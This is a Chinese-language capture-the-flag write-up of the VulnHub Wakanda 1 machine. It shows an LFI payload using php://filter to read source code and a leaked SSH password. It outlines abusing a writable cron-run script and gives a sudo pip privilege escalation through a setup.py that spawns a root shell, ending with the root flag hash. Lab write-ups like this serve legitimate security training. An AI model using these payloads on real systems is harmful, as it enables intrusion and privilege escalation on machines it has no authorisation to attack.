---
title: VulnHub-WAKANDA-1
author: AmtuOrRF
date: 2022-02-12
categories: [vulnhub]
tags: [vulnhub]
---
*2022 年 2 月 11 日，星期五*
### Introduction
> 一个新的Vibranium市场将很快在暗网中上线。您的目标，获取包含矿井确切位置的根文件。

> 中级水平

> 标志：有三个标志（标志1.txt，标志2.txt，根.txt）

### Table of Content
- nmap
- [网站页面源代码注释,泄露传参](#1)
- [使用 PHP Filters 通过 LFI 查看 php 文件的内容](#2)
- 在 index.php 文件发现一个密码，但是没有用户名
- [使用CeWL工具 爬取网站页面,生成用户名字典](#使用CeWL工具爬取网站页面,生成用户名字典)
- 通过SSH枚举有效用户名(CVE-2018-15473)
- 滥用可写脚本, 300 秒执行一次.( /srv/.antivirus.py )
- 检查 sudoers，发现低可以运行 pip - Use GTFO Bin to get root

### 网站页面源代码注释,泄露传参
```bash
http://192.168.84.7/?lang=fr
```

### 使用 PHP Filters 通过 LFI 查看 php 文件的内容
```bash
http://192.168.84.7/?lang=php://filter/read=convert.base64-encode/resource=index

# base64解密
echo "xxx"|base64 -d

# index.php 内的密码
$password ="Niamey4Ever227!!!" ;//I have to remember it
```

### 使用CeWL工具爬取网站页面,生成用户名字典
```bash
# 用户名字典
cewl http://192.168.84.7/ > user.txt
```

### 通过 SSH 枚举有效用户名 (CVE-2018-15473)
```bash
# 得到用户 mamadou
ssh mamadou@192.168.84.7 -p 3333

pass: Niamey4Ever227!!!
```
### 滥用可写脚本, 300 秒执行一次.( /srv/.antivirus.py )
```bash
# 服务器中还有另一个用户 devops

# 查找有关devops 的文件
find / -name 'devops' 2>/dev/null

# 找到一个，可写
'/srv/.antivirus.py'


# 文件是怎么运行的?
grep -Ri '.antivirus.py' /etc/ 2>/dev/null
```
### 检查 sudoers，发现低可以运行 pip - Use GTFO Bin to get root
```bash
sudo -l
# (ALL) NOPASSWD: /usr/bin/pip

echo "import os;os.system('/bin/bash')" > setup.py
sudo /usr/bin/pip install ./

cat root.txt
     _    _.--.____.--._
    ( )=.-":;:;:;;':;:;:;"-._
     \\\:;:;:;:;:;;:;::;:;:;:\
      \\\:;:;:;:;:;;:;:;:;:;:;\
       \\\:;::;:;:;:;:;::;:;:;:\
        \\\:;:;:;:;:;;:;::;:;:;:\
         \\\:;::;:;:;:;:;::;:;:;:\
          \\\;;:;:_:--:_:_:--:_;:;\
           \\\_.-"             "-._\
            \\
             \\
              \\
               \\ Wakanda 1 - by @xMagass
                \\
                 \\
    
    
    Congratulations You are Root!
    
    821ae63dbe0c573eff8b69d451fb21bc
	
```
*过程还有一些flag.txt文件*